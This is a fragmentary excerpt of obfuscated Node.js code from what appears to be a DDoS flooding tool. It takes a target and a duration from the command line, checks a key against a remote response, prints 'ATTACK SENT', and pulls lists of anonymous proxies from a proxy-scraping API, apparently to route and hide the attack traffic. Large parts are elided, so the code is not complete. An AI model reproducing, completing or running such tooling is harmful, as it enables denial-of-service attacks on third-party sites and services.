...
request.get(opts, function (_0xf96560, _0x1d504f, _0x1a02b9) {
    if (_0x1a02b9.includes(process.argv[4]) && process.argv[4].length > 14) {
        console.clear();
        console.log('=\nATTACK SENT: ' + process.argv[2] + ' DURATION: ' + process.argv[3] + '\n=');
    } else {
        console.clear();
        console.log('=\nATTACK SENT: ' + process.argv[2] + ' DURATION: ' + process.argv[3] + '\n=');
    }
...
if (args.proxy_scrape != 'false') {
    ...
    if (args.proxy_apis_file != undefined) {
        ...
        http_web_list = [
            ...
            'https://api.proxyscrape.com/v2/?request=getproxies&protocol=http&timeout=3e4&country=all&ssl=all&anonymity=anonymous',
